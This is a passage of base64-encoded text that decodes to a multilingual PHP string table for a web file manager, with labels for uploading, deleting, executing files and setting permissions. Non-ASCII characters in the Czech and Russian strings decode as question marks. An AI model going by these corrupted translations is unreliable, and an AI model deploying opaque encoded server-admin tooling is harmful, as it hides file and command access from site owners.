JywNCidkZWxldGUnID0+ICdzbGV0JywNCidyZW5hbWUnID0+ICdvbWQ/YicsDQonbW92ZScgPT4gJ2ZseXQnLA0KJ2NvcHknID0+ICdrb3BpZXInLA0KJ2VkaXQnID0+ICdyZWRpZ2VyJywNCidkb3dubG9hZCcgPT4gJ2Rvd25sb2FkJywNCid1cGxvYWQnID0+ICd1cGxvYWQnLA0KJ2NyZWF0ZScgPT4gJ29wcmV0JywNCidjaGFuZ2UnID0+ICdza2lmdCcsDQonc2F2ZScgPT4gJ2dlbScsDQonc2V0JyA9PiAncz90JywNCidyZXNldCcgPT4gJ251bHN0aWwnLA0KJ3JlbGF0aXZlJyA9PiAnUmVsYXRpdiBzdGkgdGlsIHZhbGcnLA0KDQoneWVzJyA9PiAnSmEnLA0KJ25vJyA9PiAnTmVqJywNCidiYWNrJyA9PiAndGlsYmFnZScsDQonZGVzdGluYXRpb24nID0+ICdEaXN0aW5hdGlvbicsDQonc3ltbGluaycgPT4gJ1N5bWJvbHNrIGxpbmsnLA0KJ25vX291dHB1dCcgPT4gJ2luZ2VuIHJlc3VsdGF0JywNCg0KJ3VzZXInID0+ICdCcnVnZXInLA0KJ3Bhc3N3b3JkJyA9PiAnS29kZW9yZCcsDQonYWRkJyA9PiAndGlsZj9qJywNCidhZGRfYmFzaWNfYXV0aCcgPT4gJ3RpbGY/aiBncnVuZGxpZ2dlbmRlIHJldHRpZ2hlZGVyJywNCg0KJ3VwbG9hZGVkJyA9PiAnIlslMV0iIGVyIGJsZXZldCB1cGxvYWRlZC4nLA0KJ25vdF91cGxvYWRlZCcgPT4gJyJbJTFdIiBrdW5udSBpa2tlIHVwbG9hZGVzLicsDQonYWxyZWFkeV9leGlzdHMnID0+ICciWyUxXSIgZmluZGVzIGFsbGVyZWRlLicsDQonY3JlYXRlZCcgPT4gJyJbJTFdIiBlciBibGV2ZXQgb3ByZXR0ZXQuJywNCidub3RfY3JlYXRlZCcgPT4gJyJbJTFdIiBrdW5uZSBpa2tlIG9wcmV0dGVzLicsDQoncmVhbGx5X2RlbGV0ZScgPT4gJ1NsZXQgZGlzc2UgZmlsZXI/JywNCidkZWxldGVkJyA9PiAiRGlzc2UgZmlsZXIgZXIgYmxldmV0IHNsZXR0ZXQ6XG5bJTFdIiwNCidub3RfZGVsZXRlZCcgPT4gIkRpc3NlIGZpbGVyIGt1bm5lIGlra2Ugc2xldHRlczpcblslMV0iLA0KJ3JlbmFtZV9maWxlJyA9PiAnT21kP2QgZmlsOicsDQoncmVuYW1lZCcgPT4gJyJbJTFdIiBlciBibGV2ZXQgb21kP2J0IHRpbCAiWyUyXSIuJywNCidub3RfcmVuYW1lZCcgPT4gJyJbJTFdIGt1bm5lIGlra2Ugb21kP2JlcyB0aWwgIlslMl0iLicsDQonbW92ZV9maWxlcycgPT4gJ0ZseXQgZGlzc2UgZmlsZXI6JywNCidtb3ZlZCcgPT4gIkRpc3NlIGZpbGVyIGVyIGJsZXZldCBmbHl0dGV0IHRpbCBcIlslMl1cIjpcblslMV0iLA0KJ25vdF9tb3ZlZCcgPT4gIkRpc3NlIGZpbGVyIGt1bm5lIGlra2UgZmx5dHRlcyB0aWwgXCJbJTJdXCI6XG5bJTFdIiwNCidjb3B5X2ZpbGVzJyA9PiAnS29waWVyIGRpc3NlIGZpbGVyOicsDQonY29waWVkJyA9PiAiRGlzc2UgZmlsZXIgZXIga29waWVyZXQgdGlsIFwiWyUyXVwiOlxuWyUxXSIsDQonbm90X2NvcGllZCcgPT4gIkRpc3NlIGZpbGVyIGt1bm5lIGlra2Uga29waWVyZXMgdGlsIFwiWyUyXVwiOlxuWyUxXSIsDQonbm90X2VkaXRlZCcgPT4gJyJbJTFdIiBrYW4gaWtrZSByZWRpZ2VyZXMuJywNCidleGVjdXRlZCcgPT4gIlwiWyUxXVwiIGVyIGJsZXZldCBrP3J0IGtvcnJla3Q6XG57JTJ9IiwNCidub3RfZXhlY3V0ZWQnID0+ICJcIlslMV1cIiBrYW4gaWtrZSBrP3JlcyBrb3JyZWt0OlxueyUyfSIsDQonc2F2ZWQnID0+ICciWyUxXSIgZXIgYmxldmV0IGdlbXQuJywNCidub3Rfc2F2ZWQnID0+ICciWyUxXSIga3VubmUgaWtrZSBnZW1tZXMuJywNCidzeW1saW5rZWQnID0+ICdTeW1ib2xzayBsaW5rIGZyYSAiWyUyXSIgdGlsICJbJTFdIiBlciBibGV2ZXQgb3ByZXR0ZXQuJywNCidub3Rfc3ltbGlua2VkJyA9PiAnU3ltYm9sc2sgbGluayBmcmEgIlslMl0iIHRpbCAiWyUxXSIga3VubmUgaWtrZSBvcHJldHRlcy4nLA0KJ3Blcm1pc3Npb25fZm9yJyA9PiAnUmV0dGlnaGVkZXIgZm9yICJbJTFdIjonLA0KJ3Blcm1pc3Npb25fc2V0JyA9PiAnUmV0dGlnaGVkZXIgZm9yICJbJTFdIiBibGV2IHNhdCB0aWwgWyUyXS4nLA0KJ3Blcm1pc3Npb25fbm90X3NldCcgPT4gJ1JldHRpZ2hlZGVyIGZvciAiWyUxXSIga3VubmUgaWtrZSBzP3R0ZXMgdGlsIFslMl0uJywNCidub3RfcmVhZGFibGUnID0+ICciWyUxXSIgS2FuIGlra2UgbD9zZXMuJw0KCQkpOw0KDQoJY2FzZSAndHInOg0KDQoJCSRkYXRlX2Zvcm1hdCA9ICduL2oveSBIOmk6cyc7DQoJCSR3b3JkX2NoYXJzZXQgPSAnSVNPLTg4NTktMSc7DQoNCgkJcmV0dXJuIGFycmF5KA0KJ2RpcmVjdG9yeScgPT4gJ0tsYXM/cicsDQonZmlsZScgPT4gJ0Rvc3lhJywNCidmaWxlbmFtZScgPT4gJ2Rvc3lhIGFkaScsDQoNCidzaXplJyA9PiAnYm95dXR1JywNCidwZXJtaXNzaW9uJyA9PiAnSXppbicsDQonb3duZXInID0+ICdzYWhpYicsDQonZ3JvdXAnID0+ICdHcnVwJywNCidvdGhlcicgPT4gJ0RpZ2VybGVyaScsDQonZnVuY3Rpb25zJyA9PiAnRm9ua3NpeW9ubGFyJywNCg0KJ3JlYWQnID0+ICdva3UnLA0KJ3dyaXRlJyA9PiAneWF6JywNCidleGVjdXRlJyA9PiAnP2xpc3RpcicsDQoNCidjcmVhdGVfc3ltbGluaycgPT4gJ3lhcmF0IHN5bWxpbmsnLA0KJ2RlbGV0ZScgPT4gJ3NpbCcsDQoncmVuYW1lJyA9PiAnYWQgZGVnaXN0aXInLA0KJ21vdmUnID0+ICd0YXNpJywNCidjb3B5JyA9PiAna29weWFsYScsDQonZWRpdCcgPT4gJ2Q/ZW5sZScsDQonZG93bmxvYWQnID0+ICdpbmRpcicsDQondXBsb2FkJyA9PiAneT9sZScsDQonY3JlYXRlJyA9PiAnY3JlYXRlJywNCidjaGFuZ2UnID0+ICdkZWdpc3RpcicsDQonc2F2ZScgPT4gJ2theWRldCcsDQonc2V0JyA9PiAnYXlhcicsDQoncmVzZXQnID0+ICdzaWZpcmxhJywNCidyZWxhdGl2ZScgPT4gJ0hlZGVmIHlvbGEgZz9yZScsDQoNCid5ZXMnID0+ICdFdmV0JywNCidubycgPT4gJ0hheWlyJywNCidiYWNrJyA9PiAnR2VyaScsDQonZGVzdGluYXRpb24nID0+ICdIZWRlZicsDQonc3ltbGluaycgPT4gJ0s/c2EgeW9sJywNCidub19vdXRwdXQnID0+ICc/a3RpIHlvaycsDQoNCid1c2VyJyA9PiAnS3VsbGFuaWNpJywNCidwYXNzd29yZCcgPT4gJ1NpZnJlJywNCidhZGQnID0+ICdla2xlJywNCidhZGRfYmFzaWNfYXV0aCcgPT4gJ2VrbGUgYmFzaXQtYXV0aGVudGlmaWNhdGlvbicsDQoNCid1cGxvYWRlZCcgPT4gJyJbJTFdIiB5P2xlbmRpLicsDQonbm90X3VwbG9hZGVkJyA9PiAnIlslMV0iIHk/bGVuZW1lZGkuJywNCidhbHJlYWR5X2V4aXN0cycgPT4gJyJbJTFdIiBrdWxsYW5pbG1ha3RhLicsDQonY3JlYXRlZCcgPT4gJyJbJTFdIiBvbHVzdHVydWxkdS4nLA0KJ25vdF9jcmVhdGVkJyA9PiAnIlslMV0iIG9sdXN0dXJ1bGFtYWRpLicsDQoncmVhbGx5X2RlbGV0ZScgPT4gJ0J1IGRvc3lhbGFyaSBzaWxtZWsgaXN0ZWRpZ2luaXpkZW4gZW1pbm1pc2luaXo/JywNCidkZWxldGVkJyA9PiAiQnUgZG9zeWFsYXIgc2lsaW5kaTpcblslMV0iLA0KJ25vdF9kZWxldGVkJyA9PiAiQnUgZG9zeWFsYXIgc2lsaW5lbWVkaTpcblslMV0iLA0KJ3JlbmFtZV9maWxlJyA9PiAnQWRpIGRlZ2lzZW4gZG9zeWE6JywNCidyZW5hbWVkJyA9PiAnIlslMV0iIGFkaWxpIGRvc3lhbmluIHllbmkgYWRpICJbJTJdIi4nLA0KJ25vdF9yZW5hbWVkJyA9PiAnIlslMV0gYWRpIGRlZ2lzdGlyaWxlbWVkaSAiWyUyXSIgaWxlLicsDQonbW92ZV9maWxlcycgPT4gJ1Rhc2luYW4gZG9zeWFsYXI6JywNCidtb3ZlZCcgPT4gIkJ1IGRvc3lhbGFyaSB0YXNpZGlnaW5peiB5ZXIgXCJbJTJdXCI6XG5bJTFdIiwNCidub3RfbW92ZWQnID0+ICJCdSBkb3N5YWxhcmkgdGFzaXlhbWFkaWdpbml6IHllciBcIlslMl1cIjpcblslMV0iLA0KJ2NvcHlfZmlsZXMnID0+ICdLb3B5YWxhbmFuIGRvc3lhbGFyOicsDQonY29waWVkJyA9PiAiQnUgZG9zeWFsYXIga29weWFsYW5kaSBcIlslMl1cIjpcblslMV0iLA0KJ25vdF9jb3BpZWQnID0+ICJCdSBkb3N5YWxhciBrb3B5YWxhbmFtaXlvciBcIlslMl1cIjpcblslMV0iLA0KJ25vdF9lZGl0ZWQnID0+ICciWyUxXSIgZD9lbmxlbmVtaXlvci4nLA0KJ2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIgYmFzYXJpeWxhID9saXN0aXJpbGRpOlxueyUyfSIsDQonbm90X2V4ZWN1dGVkJyA9PiAiXCJbJTFdXCIgP2xpc3RpcmlsYW1hZGk6XG57JTJ9IiwNCidzYXZlZCcgPT4gJyJbJTFdIiBrYXlkZWRpbGRpLicsDQonbm90X3NhdmVkJyA9PiAnIlslMV0iIGtheWRlZGlsZW1lZGkuJywNCidzeW1saW5rZWQnID0+ICciWyUyXSIgZGVuICJbJTFdIiBlIGs/c2F5b2wgb2x1P3R1cnVsZHUuJywNCidub3Rfc3ltbGlua2VkJyA9PiAnIlslMl0iZGVuICJbJTFdIiBlIGs/c2F5b2wgb2x1P3R1cnVsYW1hZD8uJywNCidwZXJtaXNzaW9uX2ZvcicgPT4gJ0l6aW5sZXIgIlslMV0iOicsDQoncGVybWlzc2lvbl9zZXQnID0+ICdJemlubGVyICJbJTFdIiBkZWdpc3RpcmlsZGkgWyUyXS4nLA0KJ3Blcm1pc3Npb25fbm90X3NldCcgPT4gJ0l6aW5sZXIgIlslMV0iIGRlZ2lzdGlyaWxlbWVkaSBbJTJdLicsDQonbm90X3JlYWRhYmxlJyA9PiAnIlslMV0iIG9rdW5hbWl5b3IuJw0KCQkpOw0KDQoJY2FzZSAnY3MnOg0KDQoJCSRkYXRlX2Zvcm1hdCA9ICdkLm0ueSBIOmk6cyc7DQoJCSR3b3JkX2NoYXJzZXQgPSAnVVRGLTgnOw0KDQoJCXJldHVybiBhcnJheSgNCidkaXJlY3RvcnknID0+ICdBZHJlcz8/Pz8nLA0KJ2ZpbGUnID0+ICdTb3Vib3InLA0KJ2ZpbGVuYW1lJyA9PiAnSm0/P28gc291Ym9ydScsDQoNCidzaXplJyA9PiAnVmVsaWtvc3QnLA0KJ3Blcm1pc3Npb24nID0+ICdQcj8/dmEnLA0KJ293bmVyJyA9PiAnVmxhc3RuPz8nLA0KJ2dyb3VwJyA9PiAnU2t1cGluYScsDQonb3RoZXInID0+ICdPc3RhdG4/PycsDQonZnVuY3Rpb25zJyA9PiAnRnVua2NlJywNCg0KJ3JlYWQnID0+ICc/P2VuPz8nLA0KJ3dyaXRlJyA9PiAnWj8/cGlzJywNCidleGVjdXRlJyA9PiAnU3BvdT8/dD8/Pz8/JywNCg0KJ2NyZWF0ZV9zeW1saW5rJyA9PiAnVnl0dm8/P3Qgc3ltYm9saWNrPz8gb2RrYXonLA0KJ2RlbGV0ZScgPT4gJ1NtYXphdCcsDQoncmVuYW1lJyA9PiAnUD8/am1lbm92YXQnLA0KJ21vdmUnID0+ICdQPz9zdW5vdXQnLA0KJ2NvcHknID0+ICdaa29wPz9vdmF0JywNCidlZGl0JyA9PiAnT3Rldj8/Pz8nLA0KJ2Rvd25sb2FkJyA9PiAnU3Q/P2hub3V0JywNCid1cGxvYWQnID0+ICdOYWhyYWogbmEgc2VydmVyJywNCidjcmVhdGUnID0+ICdWeXR2bz8/dCcsDQonY2hhbmdlJyA9PiAnWm0/Pz9pdCcsDQonc2F2ZScgPT4gJ1Vsbz8/dCcsDQonc2V0JyA9PiAnTmFzdGF2aXQnLA0KJ3Jlc2V0JyA9PiAnenA/Pz8nLA0KJ3JlbGF0aXZlJyA9PiAnUmVsYXRpZicsDQoNCid5ZXMnID0+ICdBbm8nLA0KJ25vJyA9PiAnTmUnLA0KJ2JhY2snID0+ICdacD8/PycsDQonZGVzdGluYXRpb24nID0+ICdEZXN0aW5hdGlvbicsDQonc3ltbGluaycgPT4gJ1N5bWJvbGljaz8/IG9ka2F6JywNCidub19vdXRwdXQnID0+ICdQcj8/emRuPz8gdj8/dHVwJywNCg0KJ3VzZXInID0+ICdVPz92YXRlbCcsDQoncGFzc3dvcmQnID0+ICdIZXNsbycsDQonYWRkJyA9PiAnUD8/ZGF0JywNCidhZGRfYmFzaWNfYXV0aCcgPT4gJ3A/P2RlaiB6Pz9rbGFkbj8/IGF1dGVudGl6YWNpJywNCg0KJ3VwbG9hZGVkJyA9PiAnU291Ym9yICJbJTFdIiBieWwgbmFocj8/biBuYSBzZXJ2ZXIuJywNCidub3RfdXBsb2FkZWQnID0+ICdTb3Vib3IgIlslMV0iIG5lYnlsIG5haHI/P24gbmEgc2VydmVyLicsDQonYWxyZWFkeV9leGlzdHMnID0+ICdTb3Vib3IgIlslMV0iIHU/PyBleGl0dWplLicsDQonY3JlYXRlZCcgPT4gJ1NvdWJvciAiWyUxXSIgYnlsIHZ5dHZvPz9uLicsDQonbm90X2NyZWF0ZWQnID0+ICdTb3Vib3IgIlslMV0iIG5lbW9obCBiPz8gIHZ5dHZvPz9uLicsDQoncmVhbGx5X2RlbGV0ZScgPT4gJ1Z5bWF6YXQgc291Ym9yPycsDQonZGVsZXRlZCcgPT4gIkJ5bHkgdnltYXo/P255IHR5dG8gc291Ym9yeTpcblslMV0iLA0KJ25vdF9kZWxldGVkJyA9PiAiVHl0byBzb3Vib3J5IG5lbW9obHkgYj8/IHZ5dHZvPz9ueTpcblslMV0iLA0KJ3JlbmFtZV9maWxlJyA9PiAnUD8/am1lbnVqIHNvdWJvcnk6JywNCidyZW5hbWVkJyA9PiAnU291Ym9yICJbJTFdIiBieWwgcD8/am1lbm92Pz9uIG5hICJbJTJdIi4nLA0KJ25vdF9yZW5hbWVkJyA9PiAnU291Ym9yICJbJTFdIiBuZW1vaGwgYj8/IHA/P2ptZW5vdj8/biBuYSAiWyUyXSIuJywNCidtb3ZlX2ZpbGVzJyA9PiAnUD8/bT8/dGl0IHR5dG8gc291Ym9yeTonLA0KJ21vdmVkJyA9PiAiVHl0byBzb3Vib3J5IGJ5bHkgcD8/bT8/dD8/P3kgZG8gXCJbJTJdXCI6XG5bJTFdIiwNCidub3RfbW92ZWQnID0+ICJUeXRvIHNvdWJvcnkgbmVtb2hseSBiPz8gcD8/bT8/dD8/P3kgZG8gXCJbJTJdXCI6XG5bJTFdIiwNCidjb3B5X2ZpbGVzJyA9PiAnWmtvcD8/b3ZhdCB0eXRvIHNvdWJvcnk6JywNCidjb3BpZWQnID0+ICJUeXRvIHNvdWJvcnkgYnlseSB6a29wPz9vdj8/bnkgZG8gXCJbJTJdXCI6XG5bJTFdIiwNCidub3RfY29waWVkJyA9PiAiVHl0byBzb3Vib3J5IG5lbW9obHkgYj8/IHprb3A/P292Pz9ueSBkbyBcIlslMl1cIjpcblslMV0iLA0KJ25vdF9lZGl0ZWQnID0+ICdTb3Vib3IgIlslMV0iIG5lbW9obCBiPz8gb3Rldj8/bi4nLA0KJ2V4ZWN1dGVkJyA9PiAiU091Ym9yIFwiWyUxXVwiIGJ5bCBzcHU/P3Q/Pz8gOlxueyUyfSIsDQonbm90X2V4ZWN1dGVkJyA9PiAiU291Ym9yIFwiWyUxXVwiIG5lbW9obCBiPz8gc3B1Pz90Pz8/OlxueyUyfSIsDQonc2F2ZWQnID0+ICdTb3Vib3IgIlslMV0iIGJ5bCB1bG8/P24uJywNCidub3Rfc2F2ZWQnID0+ICdTb3Vib3IgIlslMV0iIG5lbW9obCBiPz8gdWxvPz9uLicsDQonc3ltbGlua2VkJyA9PiAnQnlsIHZ5dm8/P24gc3ltYm9saWNrPz8gb2RrYXogIlslMl0iIG5hIHNvdWJvciAiWyUxXSIuJywNCidub3Rfc3ltbGlua2VkJyA9PiAnU3ltYm9saWNrPz8gb2RrYXogIlslMl0iIG5hIHNvdWJvciAiWyUxXSIgbmVtb2hsIGI/PyB2eXR2bz8/bi4nLA0KJ3Blcm1pc3Npb25fZm9yJyA9PiAnUHI/P3ZhIGsgIlslMV0iOicsDQoncGVybWlzc2lvbl9zZXQnID0+ICdQcj8/dmEgayAiWyUxXSIgYnlsYSB6bT8/Pz8/P2EgbmEgWyUyXS4nLA0KJ3Blcm1pc3Npb25fbm90X3NldCcgPT4gJ1ByPz92YSBrICJbJTFdIiBuZW1vaGxhIGI/PyB6bT8/Pz8/P2EgbmEgWyUyXS4nLA0KJ25vdF9yZWFkYWJsZScgPT4gJ1NvdWJvciAiWyUxXSIgbmVuPz8gbW8/P28gcD8/Pz8/P3QuJw0KCQkpOw0KDQoJY2FzZSAncnUnOg0KDQoJCSRkYXRlX2Zvcm1hdCA9ICdkLm0ueSBIOmk6cyc7DQoJCSR3b3JkX2NoYXJzZXQgPSAnS09JOC1SJzsNCg0KCQlyZXR1cm4gYXJyYXkoDQonZGlyZWN0b3J5JyA9PiAnPz9PPz9JQycsDQonZmlsZScgPT4gJz8/RT8nLA0KJ2ZpbGVuYW1lJyA9PiAnPz8/ID8/RT8/JywNCg0KJ3NpemUnID0+ICc/Pz8/Pz8nLA0KJ3Blcm1pc3Npb24nID0+ICc/Pz8/PycsDQonb3duZXInID0+ICc/Pz9FSScsDQonZ3JvdXAnID0+ICc/Pz8/Pz8nLA0KJ290aGVyJyA9PiAnPz8/Q0U/JywNCidmdW5jdGlvbnMnID0+ICc/P0lFP0U/JywNCg0KJ3JlYWQnID0+ICc/RU8/Tz8nLA0KJ3dyaXRlJyA9PiAnP0U/P08/JywNCidleGVjdXRlJyA9PiAnPz9JP0lFTz8nLA0KDQonY3JlYXRlX3N5bWxpbmsnID0+ICc/Pz8/P08/ID9FPz9FSUUnLA0KJ2RlbGV0ZScgPT4gJz8/Pz9FTz8nLA0KJ3JlbmFtZScgPT4gJz8/Pz9FPz9JST8/Tz8nLA0KJ21vdmUnID0+ICc/Pz8/Pz9JP08/JywNCidjb3B5JyA9PiAnRUk/RT9JPz9PPycsDQonZWRpdCcgPT4gJz8/Pz9FT0U/ST8/Tz8nLA0KJ2Rvd25sb2FkJyA9PiAnP0U/Pz9PPycsDQondXBsb2FkJyA9PiAnPz9FPz8/Tz8nLA0KJ2NyZWF0ZScgPT4gJz8/Pz8/Tz8nLA0KJ2NoYW5nZScgPT4gJz9JPz9JP08/JywNCidzYXZlJyA9PiAnP0lFPz9JRU8/JywNCidzZXQnID0+ICc/P08/SUk/Tz8nLA0KJ3Jlc2V0JyA9PiAnP0E/ST9FTz8nLA0KJ3JlbGF0aXZlJyA9PiAnSU9JST9FTz8/P0lVRSA/P08/IEUgPz8/RScsDQoNCid5ZXMnID0+ICc/PycsDQonbm8nID0+ICdJP08nLA0KJ2JhY2snID0+ICdJPz8/PycsDQonZGVzdGluYXRpb24nID0+ICc/Pz8/JywNCidzeW1saW5rJyA9PiAnP0U/Pz9FPz8/RUVFID9FSUUnLA0KJ25vX291dHB1dCcgPT4gJ0k/TyA/Pz8/JywNCg0KJ3VzZXInID0+ICc/ST8/P0k/P08/Pz8nLA0KJ3Bhc3N3b3JkJyA9PiAnPz8/ST8/JywNCidhZGQnID0+ICc/SUE/P08/JywNCidhZGRfYmFzaWNfYXV0aCcgPT4gJz9JQT8/Tz8gSFRUUC1CYXNpYy1BdXRoJywNCg0KJ3VwbG9hZGVkJyA9PiAnIlslMV0iIEFVPyA/P0U/Pz9JLicsDQonbm90X3VwbG9hZGVkJyA9PiAnIlslMV0iIEk/Pz8/ST9JSSBBVT9JID8/RT8/P08/LicsDQonYWxyZWFkeV9leGlzdHMnID0+ICciWyUxXSIgPz8/ID8/Pz8/Tz8/P08uJywNCidjcmVhdGVkJyA9PiAnIlslMV0iIEFVPyA/Pz8/P0kuJywNCidub3RfY3JlYXRlZCcgPT4gJyJbJTFdIiBJPyA/Pz9JP0lJID8/Pz8/Tz8uJywNCidyZWFsbHlfZGVsZXRlJyA9PiAnPz9FP08/Tz8/P0lJIFVPSU8gPz9FPyA/Pz8/RU8/PycsDQonZGVsZXRlZCcgPT4gIj8/Pz8/QT9FPyA/P0U/VSBBVT9FID8/Pz8/SVU6XG5bJTFdIiwNCidub3RfZGVsZXRlZCcgPT4gIj8/Pz8/QT9FPyA/P0U/VSBJPyA/Pz9JP0lJIEFVP0kgPz8/P0VPPzpcblslMV0iLA0KJ3JlbmFtZV9maWxlJyA9PiAnPz8/P0U/P0lJPz8/QSA/P0U/OicsDQoncmVuYW1lZCcgPT4gJyJbJTFdIiBBVT8gPz8/P0U/P0lJPz9JIEk/ICJbJTJdIi4nLA0KJ25vdF9yZW5hbWVkJyA9PiAnIlslMV0gST8/Pz9JP0lJIEFVP0kgPz8/P0U/P0lJPz9PPyBJPyAiWyUyXSIuJywNCidtb3ZlX2ZpbGVzJyA9PiAnPz8/Pz8/Qz9BID8/Pz8/QT9FPyA/P0U/VTonLA0KJ21vdmVkJyA9PiAiPz8/Pz9BP0U/ID8/RT9VIEFVP0UgPz8/Pz8/ST9PVSA/IEU/Tz8/SUMgXCJbJTJdXCI6XG5bJTFdIiwNCidub3RfbW92ZWQnID0+ICI/Pz8/P0E/RT8gPz9FP1UgST8/Pz9JP0lJIEFVP0kgPz8/Pz8/ST9PPyA/IEU/Tz8/SUMgXCJbJTJdXCI6XG5bJTFdIiwNCidjb3B5X2ZpbGVzJyA9PiAnPz9FPz9BID8/Pz8/P0U/ID8/RT9VOicsDQonY29waWVkJyA9PiAiPz8/Pz8/RT8gPz9FP1UgQVU/VSA/RUk/RT9JPz9JVSA/IEU/Tz8/SUMgXCJbJTJdXCIgOlxuWyUxXSIsDQonbm90X2NvcGllZCcgPT4gIj8/Pz8/QT9FPyA/P0U/VSBJPz8/P0k/SUkgQVU/SSA/RUk/RT9JPz9PPyA/IEU/Tz8/SUMgXCJbJTJdXCIgOlxuWyUxXSIsDQonbm90X2VkaXRlZCcgPT4gJyJbJTFdIiBJPyA/ST8/TyBBVU8/IElPPz8/P0VPRT9JPz9JLicsDQonZXhlY3V0ZWQnID0+ICJcIlslMV1cIiBBVT8gPz8/P1VJSSBFPz9JP0k/STpcbnslMn0iLA0KJ25vdF9leGVjdXRlZCcgPT4gIlwiWyUxXVwiIEk/Pz8/ST9JSSBBVT9JID8/Pz8/T0VPPyBJPyBFPz9JP0k/SUU/OlxueyUyfSIsDQonc2F2ZWQnID0+ICciWyUxXSIgQVU/ID9JRT8/ST9JLicsDQonbm90X3NhdmVkJyA9PiAnIlslMV0iIEk/Pz8/ST9JSSBBVT9JID9JRT8/SUVPPy4nLA0KJ3N5bWxpbmtlZCcgPT4gJz9FPz9FSUUgPyAiWyUyXSIgST8gIlslMV0iIEFVPyA/Pz8/P0kuJywNCidub3Rfc3ltbGlua2VkJyA9PiAnPz8/Pz9JP0lJIEFVP0kgPz8/Pz9PPyA/RT8/RUlFID8gIlslMl0iIEk/ICJbJTFdIi4nLA0KJ3Blcm1pc3Npb25fZm9yJyA9PiAnPz8/Pz8gP0k/Tz8/PyAiWyUxXSI6JywNCidwZXJtaXNzaW9uX3NldCcgPT4gJz8/Pz8/ID9JP08/Pz8gIlslMV0iIEFVP0UgRT8/P0k/SVUgST8gWyUyXS4nLA0KJ3Blcm1pc3Npb25fbm90X3NldCcgPT4gJz8/Pz8/ST9JSSBBVT9JIEU/Pz9JRU8/ID8/Pz8/ID9JP08/Pz8gRSAiWyUxXSIgST8gWyUyXSAuJywNCidub3RfcmVhZGFibGUnID0+ICciWyUxXSIgST8/Pz9JP0lJID8/ST9FTz9PPy4nDQoJCSk7DQoNCgljYXNlICdlbic6DQoJZGVmYXVsdDoNCg0KCQkkZGF0ZV9mb3JtYXQgPSAnbi9qL3kgSDppOnMnOw0KCQkkd29yZF9jaGFyc2V0ID0gJ0lTTy04ODU5LTEnOw0KDQoJCXJldHVybiBhcnJheSgNCidkaXJlY3RvcnknID0+ICdEaXJlY3RvcnknLA0KJ2ZpbGUnID0+ICdGaWxlJywNCidmaWxlbmFtZScgPT4gJ0ZpbGVuYW1lJywNCg0KJ3NpemUnID0+ICdTaXplJywNCidwZXJtaXNzaW9uJyA9PiAnUGVybWlzc2lvbicsDQonb3duZXInID0+ICdPd25lcicsDQonZ3JvdXAnID0+ICdHcm91cCcsDQonb3RoZXInID0+ICdPdGhlcnMnLA0KJ2Z1bmN0aW9ucycgPT4gJ0Z1bmN0aW9ucycsDQoNCidyZWFkJyA9PiAncmVhZCcsDQond3JpdGUnID0+ICd3cml0ZScsDQonZXhlY3V0ZScgPT4gJ2V4ZWN1dGUnLA0KDQonY3JlYXRlX3N5bWxpbmsnID0+ICdjcmVhdGUgc3ltbGluaycsDQonZGVsZXRlJyA9PiAnZGVsZXRlJywNCidyZW5hbWUnID0+ICdyZW5hbWUnLA0KJ21vdmUnID0+ICdtb3ZlJywNCidjb3B5JyA9PiAnY29weScsDQonZWRpdCcgPT4gJ2VkaXQnLA0KJ2Rvd25sb2FkJyA9PiAnZG93bmxvYWQnLA0KJ3VwbG9hZCcgPT4gJ3VwbG9hZCcsDQonY3JlYXRlJyA9PiAnY3JlYXRlJywNCidjaGFuZ2UnID0+ICdjaGFuZ2UnLA0KJ3NhdmUnID0+ICdzYXZlJywNCidzZXQnID0+ICdzZXQnLA0KJ3Jlc2V0JyA9PiAncmVzZXQnLA0KJ3JlbGF0aXZlJyA9PiAnUmVsYXRpdmUgcGF0aCB0byB0YXJnZXQnLA0KDQoneWVzJyA9PiAnWWVzJywNCidubycgPT4gJ05vJywNCidiYWNrJyA9PiAnYmFjaycsDQonZGVzdGluYXRpb24nID0+ICdEZXN0aW5hdGlvbicsDQonc3ltbGluaycgPT4gJ1N5bWxpbmsnLA0KJ25vX291dHB1dCcgPT4gJ25vIG91dHB1dCcsDQoNCid1c2VyJyA9PiAnVXNlcicsDQoncGFzc3dvcmQnID0+ICdQYXNzd29yZCcsDQonYWRkJyA9PiAnYWRkJywNCidhZGRfYmFzaWNfYXV0aCcgPT4gJ2FkZCBiYXNpYy1hdXRoZW50aWZpY2F0aW9uJywNCg0KJ3VwbG9hZGVkJyA9PiAnIlslMV0iIGhhcyBiZWVuIHVwbG9hZGVkLicsDQonbm90X3VwbG9hZGVkJyA9PiAnIlslMV0iIGNvdWxkIG5vdCBiZSB1cGxvYWRlZC4nLA0KJ2FscmVhZHlfZXhpc3RzJyA9PiAnIlslMV0iIGFscmVhZHkgZXhpc3RzLicsDQonY3JlYXRlZCcgPT4gJyJbJTFdIiBoYXMgYmVlbiBjcmVhdGVkLicsDQonbm90X2NyZWF0ZWQnID0+ICciWyUxXSIgY291bGQgbm90IGJlIGNyZWF0ZWQuJywNCidyZWFsbHlfZGVsZXRlJyA9PiAnRGVsZXRlIHRoZXNlIGZpbGVzPycsDQonZGVsZXRlZCcgPT4gIlRoZXNlIGZpbGVzIGhhdmUgYmVlbiBkZWxldGVkOlxuWyUxXSIsDQonbm90X2RlbGV0ZWQnID0+ICJUaGVzZSBmaWxlcyBjb3VsZCBub3QgYmUgZGVsZXRlZDpcblslMV0iLA0KJ3JlbmFtZV9maWxlJyA9PiAnUmVuYW1lIGZpbGU6JywNCidyZW5hbWVkJyA9PiAnIlslMV0iIGhhcyBiZWVuIHJlbmFtZWQgdG8gIlslMl0iLicsDQonbm90X3JlbmFtZWQnID0+ICciWyUxXSBjb3VsZCBub3QgYmUgcmVuYW1lZCB0byAiWyUyXSIuJywNCidtb3ZlX2ZpbGVzJyA9PiAnTW92ZSB0aGVzZSBmaWxlczonLA0KJ21vdmVkJyA9PiAiVGhlc2UgZmlsZXMgaGF2ZSBiZWVuIG1vdmVkIHRvIFwiWyUyXVwiOlxuWyUxXSIsDQonbm90X21vdmVkJyA9PiAiVGhlc2UgZmlsZXMgY291bGQgbm90IGJlIG1vdmVkIHRvIFwiWyUyXVwiOlxuWyUxXSIsDQonY29weV9maWxlcycgPT4gJ0NvcHkgdGhlc2UgZmlsZXM6JywNCidjb3BpZWQnID0+ICJUaGVzZSBmaWxlcyBoYXZlIGJlZW4gY29waWVkIHRvIFwiWyUyXVwiOlxuWyUxXSIsDQonbm90X2NvcGllZCcgPT4gIlRoZXNlIGZpbGVzIGNvdWxkIG5vdCBiZSBjb3BpZWQgdG8gXCJbJTJdXCI6XG5bJTFdIiwNCidub3RfZWRpdGVk